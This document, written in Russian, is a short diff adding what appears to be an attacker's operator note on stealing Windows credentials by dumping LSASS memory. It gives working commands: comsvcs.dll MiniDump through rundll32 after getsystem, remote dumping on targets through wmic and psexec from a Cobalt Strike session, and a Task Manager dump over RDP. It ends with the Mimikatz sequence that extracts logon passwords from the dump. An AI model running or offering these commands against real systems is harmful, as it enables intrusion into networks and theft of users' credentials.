@@ -1,0 +1,18 @@
+LSASS: 
+метод через coba:  (*** отдельное спасибо @Sven )
+!*  1) getsystem 
+2) shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full   (пид указываем от лсас)
+(снять на удаленной тачке) coba_wmic:
+shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full"
+remote-exec psexec [target] cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full
+=======
+метод через RDP: 
+открываем taskmgr => PKM po lsass process => create Dump file.  \\ Далее выкачиваем файл себе на комп, 
+
+=======
+как расхешить:
+открываем мимик и далее:
+privilege::debug
+sekurlsa::minidump A:\3.WORK\BL-ws20\lsass.DMP (путь заменяем до нашего файла)
+log
+sekurlsa::logonpasswords
